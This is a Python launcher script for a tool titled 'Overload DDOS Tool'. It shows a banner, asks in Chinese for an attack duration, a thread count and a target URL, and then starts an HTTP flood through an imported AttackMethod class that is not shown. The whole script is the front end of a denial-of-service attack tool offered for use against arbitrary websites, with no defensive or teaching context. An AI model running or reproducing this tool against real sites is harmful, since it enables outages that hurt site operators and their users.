
import os
import sys
import argparse
from colorama import Fore

os.system("@cls & @title Overload DDOS Tool by: 7zx and 8fn & @color e")

os.chdir(os.path.dirname(os.path.realpath(__file__)))

try:
    from tools.crash import CriticalError
    import tools.addons.clean
    import tools.addons.logo
    import tools.addons.wireshark
    from tools.method import AttackMethod
except ImportError as err:
    CriticalError("Failed to import some packages", err)
    sys.exit(1)

method = "HTTP"
logo ='''
 ██████╗███████╗██╗     ███████╗███████╗████████╗██╗ █████╗ ██╗         ██████╗ ███████╗██╗███╗   ██╗ ██████╗ 
██╔════╝██╔════╝██║     ██╔════╝██╔════╝╚══██╔══╝██║██╔══██╗██║         ██╔══██╗██╔════╝██║████╗  ██║██╔════╝ 
██║     █████╗  ██║     █████╗  ███████╗   ██║   ██║███████║██║         ██████╔╝█████╗  ██║██╔██╗ ██║██║  ███╗
██║     ██╔══╝  ██║     ██╔══╝  ╚════██║   ██║   ██║██╔══██║██║         ██╔══██╗██╔══╝  ██║██║╚██╗██║██║   ██║
╚██████╗███████╗███████╗███████╗███████║   ██║   ██║██║  ██║███████╗    ██████╔╝███████╗██║██║ ╚████║╚██████╔╝
 ╚═════╝╚══════╝╚══════╝╚══════╝╚══════╝   ╚═╝   ╚═╝╚═╝  ╚═╝╚══════╝    ╚═════╝ ╚══════╝╚═╝╚═╝  ╚═══╝ ╚═════╝ 

'''
CRED2 = '\33[91m'

if __name__ == "__main__":
    os.system('cls' if os.name == 'nt' else 'clear')
    print(CRED2 + logo + CRED2)
    time = int(input(f"{Fore.RED}   ├───攻击时间:{Fore.RESET}"))
    threads = int(input(f"{Fore.RED}   ├───线程:{Fore.RESET}"))
    target = str(input(f"{Fore.RED}   └───URL(网址):{Fore.RESET}"))
    with AttackMethod(
        duration=time, name=method, threads=threads, target=target
    ) as Flood:
        Flood.Start()
else:
    sys.exit(1)
